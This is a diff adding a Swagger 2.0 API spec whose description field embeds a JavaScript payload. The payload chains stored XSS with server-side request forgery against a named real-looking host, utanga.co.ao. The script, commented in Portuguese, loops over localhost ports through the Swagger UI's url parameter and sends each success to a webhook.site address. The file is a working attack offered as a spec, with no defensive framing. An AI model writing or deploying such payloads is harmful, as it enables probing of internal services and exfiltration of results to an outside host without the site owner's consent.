@@ -1,0 +1,43 @@
+swagger: "2.0"
+info:
+  title: "SSRF Test - ASPAS RETAS"
+  description: |
+    <script>
+      // Teste SIMPLES primeiro
+      alert('SSRF Test Starting...');
+      
+      // Serviços para testar (com aspas RETAS)
+      var services = [
+        'http://localhost:80',
+        'http://localhost:3128',
+        'http://localhost:8080',
+        'http://127.0.0.1:443'
+      ];
+      
+      services.forEach(function(service) {
+        var ssrfUrl = '/api/swagger/index.html?url=' + encodeURIComponent(service);
+        console.log('Testing:', service);
+        
+        // Usar fetch com no-cors
+        fetch(ssrfUrl, { mode: 'no-cors' })
+          .then(function() {
+            console.log('Success:', service);
+            // Tentar reportar para webhook
+            fetch('https://webhook.site/f3880c57-1d67-42ff-b415-4d02c16d37a5?success=' + encodeURIComponent(service), { mode: 'no-cors' });
+          })
+          .catch(function() {
+            console.log('Failed:', service);
+          });
+      });
+      
+      alert('SSRF tests sent! Check webhook.site');
+    </script>
+host: "utanga.co.ao"
+basePath: "/api"
+paths:
+  /test:
+    get:
+      summary: "Test"
+      responses:
+        200:
+          description: "OK"
